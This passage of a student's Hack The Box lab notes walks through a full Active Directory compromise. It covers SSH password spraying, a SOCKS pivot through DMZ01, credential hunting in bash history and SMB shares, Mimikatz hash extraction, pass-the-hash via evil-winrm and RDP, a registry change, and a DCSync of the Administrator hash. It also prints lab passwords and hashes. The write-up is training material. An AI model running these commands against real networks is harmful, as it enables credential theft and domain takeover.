export KRB5CCNAME=/tmp/dc.ccache
klist                       # check it worked and see expiry time
```

**Got the DC's own account (`DC01$`)?** Dump password hashes for the whole domain:

```shellsession

impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/DC01$'@dc01.<domain>
```

**Got a normal user?** Log in with WinRM (works if they're in "Remote Management Users"):

```shellsession

evil-winrm -i dc01.<domain> -r <DOMAIN>
```

---

## Gotchas (don't skip these)

- Printer bug only works if the target has the **Print Spooler service** running.
- The Shadow Credentials password is shown **once** — copy it immediately.
- If the DC rejects your cert for login, you can't get a TGT this way. Use **PassTheCert** on LDAPS instead (reset passwords, grant DCSync, etc.).
- Stage 3 is identical to regular Pass the Ticket — nothing new to learn there.


## Question
  
[Unmasking Credentials: A Deep Dive into Pass-the-Certificate Attacks | by Sau Rav | Medium](https://medium.com/@ravsau00/unmasking-credentials-a-deep-dive-into-pass-the-certificate-attacks-8c001943e5fc) 




# Skill Assessment


| **Command**                                                         | **Description**                                                                                                                                                                                                                                                                               |
| ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh -D 9050 user@<DMZ01>`                                          | Establishes a SOCKS proxy on port 9050 via SSH. Once the DMZ01 host is compromised, this allows routing of traffic through the DMZ into the internal network — enabling pivoting to otherwise inaccessible systems.                                                                           |
| `sudo vim /etc/proxychains.conf`                                    | Opens the ProxyChains configuration file in Vim. Ensure that the line `socks4 127.0.0.1 9050` is present under the `[ProxyList]` section — this defines the local SOCKS proxy (created by SSH) through which traffic will be routed. This entry may already exist but could be commented out. |
| `sudo proxychains -q nmap -sT -Pn 172.16.119.13 --open`             | Performs a TCP scan on an internal host using Nmap. The `proxychains` prefix routes the scan through the previouly established SOCKS proxy, allowing internal reconnaissance from the attacker's machine. Note that the `-sT` option is required when using Nmap with ProxyChains.            |
| `proxychains xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!` | Launches an RDP session routed through the SOCKS proxy. This is useful for interacting with internal desktops (like domain-joined Windows hosts) when direct network access is not possible.                                                                                                  |


## 1. Initial Enumeration

I first created a wordlist for **Betty Jayde** using **username-anarchy**.

Then I ran Nmap against the first machine to see which services were available:

```bash
nmap <IP>
```

SSH was available, so I decided to try the username list against it.

I already had the password, username list, and target IP, so I ran:

```bash
hydra -L users.txt -p 'Texas123!@#' ssh://10.129.155.79
```

**Yes! It worked.** I found the valid username:

```text
jbetty
```

---

## 2. Getting Into the DMZ

I then SSHed into the DMZ machine and created a SOCKS proxy:

```bash
ssh -D 9050 jbetty@DMZ01
```

This creates a SOCKS proxy on my Kali machine at:

```text
127.0.0.1:9050
```

I kept this SSH connection open and opened a **new Kali terminal**.

The idea is:

```text
Kali
  ↓
127.0.0.1:9050
  ↓
DMZ01
  ↓
Internal Network
```

ProxyChains allows my tools to send their traffic through this SOCKS proxy.

---

## 3. Enumerating the Internal Network

In the new terminal, I connected through the proxy:

```bash
proxychains ssh jbetty@internal_network
```

There wasn't much else immediately available , so I checked the user's Bash history:

```bash
cat ~/.bash_history
```

I found another set of credentials:

```text
hwilliam : dealer-screwed-gym1
```

This gave me another username and password that I could use against the internal machines.

I also checked `/etc/hosts`:

```bash
cat /etc/hosts
```

This was useful because it showed which IP addresses were associated with which hostnames. I found:

```text
172.16.119.11 nexura.htb DC01 DC01.nexura.htb
```

So I now knew that:

```text
172.16.119.11 → DC01 → DC01.nexura.htb → nexura.htb
```

---

## 4. Enumerating FILE01

I kept my current SSH/proxy connection open and opened another Kali terminal. I then scanned the internal target through ProxyChains:

```bash
proxychains nmap -sT -Pn <FILE01_IP> --open
```

I found SMB and several other services open. I first tried connecting to SMB with:

```bash
proxychains smbclient -L 172.16.119.10 -U hwilliam%'dealer-screwed-gym1'
```

It failed. I then realized that the account was a **domain account**, so I included the domain:

```bash
proxychains smbclient -L 172.16.119.10 -U nexura.htb/hwilliam%'dealer-screwed-gym1'
```

This time it worked and listed the available shares.

---

## 5. Connecting to SMB

I located the Impacket SMB client:

```bash
locate smbclient.py
```

I copied the path and used it through ProxyChains:

```bash
sudo proxychains python3 /usr/share/doc/python3-impacket/examples/smbclient.py nexura.htb/hwilliam:'dealer-screwed-gym1'@172.16.119.10
```

This gave me an SMB shell. I explored the available shares and found useful files in the **HR** and **PRIVATE** shares. I downloaded the relevant password files and checked what type of files they were:

```bash
file <filename>
```

I then used John the Ripper to crack the password-protected files. I eventually recovered:

```text
michaeljackson
hwilliam@JUMP01:00001512
irule123
```

The important password for the Password Safe file was:

```text
michaeljackson
```

I opened the `.psafe` file using that master password and recovered:

```text
bdavid: caramel-cigars-reply1
stom: fails-nibble-disturb4
hwilliam: warned-wobble-occur8
```

At this point I had credentials for three more accounts.

---

## 6. Accessing JUMP01

Since `hwilliam` appeared to have access to JUMP01, I enumerated it again:

```bash
proxychains nmap -sT -Pn 172.16.119.7 --open
```

I found RDP open. I tried connecting with the credentials I had for `hwilliam`, including:

```text
00001512
```

and:

```text
warned-wobble-occur8
```

but those attempts didn't work. Eventually, the working password was:

```text
dealer-screwed-gym1
```

---

## 7. Using bdavid

Although I could authenticate as `hwilliam`, I found that the account didn't have the authorization I needed. I therefore connected to JUMP01 as `bdavid`:

```bash
proxychains xfreerdp /v:172.16.119.7 /d:nexura.htb /u:bdavid /p:caramel-cigars-reply1 /drive:lol,/home/htb-ac-1094410/lol
```

The `/drive` option shared my local `lol` directory with the RDP session. I transferred Mimikatz to the RDP machine and used it to inspect the available credential material. From there, I found the NTLM hash for `stom`:

```text
21ea958524cfd9a7791737f8d2f764fa
```

---

## 8. Using Stom's Hash

I then attempted to authenticate to DC01 using `stom`'s NTLM hash:

```bash
proxychains xfreerdp /v:172.16.119.11 /u:stom /d:nexura.htb /pth:21ea958524cfd9a7791737f8d2f764fa /drive:lol,/home/htb-ac-1094410/lol /cert:ignore
```

However, RDP required the appropriate **Restricted Admin** configuration. So I first used the hash to obtain a WinRM session:

```bash
proxychains evil-winrm -i 172.16.119.11 -u 'nexura.htb\stom' -H '21ea958524cfd9a7791737f8d2f764fa'
```

This gave me a shell on DC01. From that shell, I enabled the required RDP configuration:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0 /f
```

I then tried the RDP connection again with the hash:

```bash
proxychains xfreerdp /v:172.16.119.11 /u:stom /d:nexura.htb /pth:21ea958524cfd9a7791737f8d2f764fa /drive:lol,/home/htb-ac-1094410/lol /cert:ignore
```

This time I was able to get onto **DC01**. At this point, I had effectively reached the **Domain Controller**.

---

## 9. Dumping Domain Credentials

Once I was on DC01, I started Mimikatz and checked the credentials available through LSASS:

```text
sekurlsa::logonpasswords
```

I didn't find anything new that was useful for the Administrator account. Since I was now on the Domain Controller, I moved to the `lsadump` functionality. I used:

```text
lsadump::dcsync /domain:nexura.htb /dc:DC01 /user:Administrator
```

And finally — **yes!** I got the Administrator account's NTLM hash.

The important distinction I learned here was:

```text
sekurlsa::logonpasswords
        ↓
Credentials/authentication material in LSASS

lsadump::dcsync
        ↓
Queries Active Directory credential data
```


### Key things I learned

- **`/etc/hosts`** helped me map internal IP addresses to hostnames.
    
- **Domain authentication matters** — `nexura.htb/hwilliam` worked where just `hwilliam` did not.
    
- **ProxyChains + SOCKS** let me reach machines on the internal network through DMZ01.
    
- **`sekurlsa`** deals mainly with authentication material held in LSASS.
    
- **`lsadump::dcsync`** interacts with Active Directory credential data.
    
- Getting a valid credential doesn't necessarily mean the account has the **authorization** needed for the next step.
    
- The main chain was essentially **initial access → pivot → credential discovery → lateral movement → privilege/domain escalation → Domain Controller**.